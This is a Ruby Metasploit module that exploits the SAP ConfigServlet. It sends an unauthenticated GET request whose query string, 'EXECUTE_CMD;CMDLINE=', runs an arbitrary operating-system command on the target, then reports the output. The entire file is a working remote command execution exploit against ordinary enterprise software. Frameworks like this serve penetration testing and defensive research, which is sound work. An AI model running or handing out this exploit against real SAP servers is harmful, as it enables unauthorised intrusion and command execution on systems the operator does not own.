##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SAP ConfigServlet OS Command Execution',
        'Description' => %q{
          This module allows execution of operating system commands through the SAP
          ConfigServlet without any authentication.
        },
        'Author' => [
          'Dmitry Chastuhin', # Vulnerability discovery (based on the reference presentation)
          'Andras Kabai' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'OSVDB', '92704' ],
          [ 'EDB', '24963' ],
          [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf']
        ],
        'DisclosureDate' => '2012-11-01', # Based on the reference presentation
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(50000),
        OptString.new('CMD', [ true, 'The command to execute', 'whoami']),
        OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet'])
      ]
    )
  end

  def run
    begin
      print_status("#{rhost}:#{rport} - Sending remote command: " + datastore['CMD'])
      uri = normalize_uri(target_uri.path, 'ConfigServlet')

      res = send_request_cgi(
        {
          'uri' => uri,
          'method' => 'GET',
          'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text.uri_encode(datastore['CMD'])
        }
      )
      if !res || (res.code != 200)
        print_error("#{rhost}:#{rport} - Exploit failed")
        return
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Failed to connect to the server")
      return
    end

    if res.body.include?('Process created')
      print_good("#{rhost}:#{rport} - Exploited successfully\n")
      print_line("#{rhost}:#{rport} - Command: #{datastore['CMD']}\n")
      print_line("#{rhost}:#{rport} - Output: #{res.body}")
    else
      print_error("#{rhost}:#{rport} - Exploit failed")
      vprint_error("#{rhost}:#{rport} - Output: #{res.body}")
    end
  end
end
